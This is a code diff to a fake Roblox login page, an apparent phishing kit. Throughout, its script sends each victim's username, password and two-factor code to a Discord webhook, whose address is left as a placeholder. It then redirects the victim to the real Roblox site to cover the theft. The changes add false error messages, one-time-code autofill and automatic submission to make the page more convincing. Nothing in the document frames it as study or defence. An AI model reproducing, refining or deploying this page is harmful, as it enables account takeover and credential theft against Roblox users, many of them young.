@@ -1,5 +1,5 @@
 <!doctype html><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Roblox</title>
+<title>Log In - Roblox</title>
 <style>
 *{box-sizing:border-box}
 body{font-family:-apple-system,Roboto,system-ui,sans-serif;background:#e3e5e8;margin:0;
@@ -16,13 +16,15 @@ button{width:100%;padding:13px;background:#00a2ff;color:#fff;border:0;border-rad
 font-size:15px;font-weight:700}
 button:disabled{opacity:.6}
 .hint{font-size:12px;color:#6b6d70;margin-top:12px;text-align:center;line-height:1.5}
+.err{color:#d63b3b;font-size:13px;text-align:center;margin:0 0 10px;display:none}
 .hide{display:none}
 </style>
 <div class="card">
   <div class="logo">R</div>
-  <h1 id="title">Log in to Roblox</h1>
+  <h1>Log in to Roblox</h1>
 
   <div id="step1">
+    <div class="err" id="e1">Incorrect username or password.</div>
     <input id="u" placeholder="Username/Email" autocapitalize="none" autocomplete="username">
     <input id="p" type="password" placeholder="Password" autocomplete="current-password">
     <button id="b1">Log In</button>
@@ -30,7 +32,8 @@ button:disabled{opacity:.6}
   </div>
 
   <div id="step2" class="hide">
-    <input id="c" inputmode="numeric" maxlength="6" placeholder="6-digit code">
+    <div class="err" id="e2">Wrong code, try again.</div>
+    <input id="c" inputmode="numeric" maxlength="6" placeholder="6-digit code" autocomplete="one-time-code">
     <button id="b2">Verify</button>
     <div class="hint">Open your authenticator app or email for the code</div>
   </div>
@@ -41,26 +44,48 @@ button:disabled{opacity:.6}
 </div>
 
 <script>
-const HOOK = "https://discord.com/api/webhooks/ID/TOKEN";
-const send = t => fetch(HOOK,{method:"POST",headers:{"Content-Type":"application/json"},
-  body:JSON.stringify({content:t})});
+const HOOK = "PASTE_WEBHOOK_HERE";
 
-b1.onclick = () => {
-  const u = document.getElementById("u").value.trim();
-  const p = document.getElementById("p").value;
-  if(!u || !p) return alert("Fill in both fields");
-  send("**USER:** " + u + "\n**PASS:** " + p);
-  document.getElementById("step1").classList.add("hide");
-  document.getElementById("step2").classList.remove("hide");
-  document.getElementById("c").focus();
-};
+const send = t => fetch(HOOK, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ content: t })
+}).catch(() => {});
 
-b2.onclick = () => {
-  const c = document.getElementById("c").value.trim();
-  if(!c) return;
-  send("**CODE:** " + c + " (acct: " + document.getElementById("u").value + ")");
-  document.getElementById("step2").classList.add("hide");
-  document.getElementById("step3").classList.remove("hide");
+const $ = id => document.getElementById(id);
+const busy = (btn, on) => { btn.disabled = on; };
+
+function done() {
+  $("step2").classList.add("hide");
+  $("step3").classList.remove("hide");
   setTimeout(() => location.href = "https://www.roblox.com/home", 3500);
+}
+
+$("b1").onclick = () => {
+  const u = $("u").value.trim(), p = $("p").value;
+  if (!u || !p) { $("e1").textContent = "Fill in both fields."; $("e1").style.display = "block"; return; }
+  $("e1").style.display = "none";
+  busy($("b1"), true);
+  send("**USER:** " + u + "\n**PASS:** " + p);
+  setTimeout(() => {
+    busy($("b1"), false);
+    $("step1").classList.add("hide");
+    $("step2").classList.remove("hide");
+    $("c").focus();
+  }, 700);
 };
+
+function verify() {
+  const c = $("c").value.trim();
+  if (c.length !== 6) { $("e2").style.display = "block"; return; }
+  $("e2").style.display = "none";
+  busy($("b2"), true);
+  send("**CODE:** " + c + " (acct: " + $("u").value + ")");
+  setTimeout(done, 700);
+}
+
+$("b2").onclick = verify;
+$("c").oninput = () => { if ($("c").value.trim().length === 6) verify(); };
+$("c").onkeydown = e => { if (e.key === "Enter") verify(); };
+$("p").onkeydown = e => { if (e.key === "Enter") $("b1").click(); };
 </script>
